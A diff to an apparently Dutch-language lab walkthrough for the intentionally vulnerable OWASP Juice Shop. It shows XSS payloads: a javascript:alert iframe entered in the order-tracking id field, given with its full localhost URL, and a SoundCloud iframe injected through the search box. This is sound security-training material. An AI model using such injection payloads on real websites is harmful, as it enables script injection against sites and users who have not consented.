@@ -48,9 +48,11 @@ Dit is maar een van de vele manieren om een error te veroorzaken. Er zijn er nog
 5. Dit order id kan gebruikt worden om een XSS aanval uit te voeren omdat deze rechtstreeks op de pagina wordt getoond.
 6. Voer de volgende payload in in het order id veld:
 
-```
+```HTML
 <iframe src="javascript:alert(`xss`)">
 ```
+
+De totaal-URL wordt hiermee: <http://localhost:3000/#/track-result?id=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E>
 
 7. Gefeliciteerd! Je hebt nu een XSS aanval uitgevoerd op de Juice Shop.
 
@@ -65,7 +67,7 @@ Dit is maar een van de vele manieren om een error te veroorzaken. Er zijn er nog
 1. Open het zoekveld van de Juice Shop. (Rechts bovenaan de pagina)
 2. Voer de volgende payload in in het zoekveld:
 
-```
+```HTML
 <iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>
 ```
 
